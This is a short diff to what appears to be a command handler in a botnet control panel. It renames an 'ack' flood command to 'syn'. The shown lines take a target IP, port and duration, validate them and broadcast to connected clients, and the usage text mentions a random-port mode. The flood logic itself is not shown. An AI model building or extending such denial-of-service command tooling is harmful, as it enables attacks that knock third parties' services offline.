@@ -1,6 +1,6 @@
 from colorama import Fore
 
-def ack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
+def syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
     if len(args) == 4:
         ip = args[1]
         port = args[2]
@@ -17,5 +17,5 @@ def ack(args, validate_ip, validate_port, validate_time, send, client, ansi_clea
         else:
             send(client, Fore.RED + '\nInvalid IP-address\n')
     else:
-        send(client, '\nUsage: .ack [IP] [PORT] [TIME]')
+        send(client, '\nUsage: .syn [IP] [PORT] [TIME]')
         send(client, 'Use port 0 for random port mode\n')
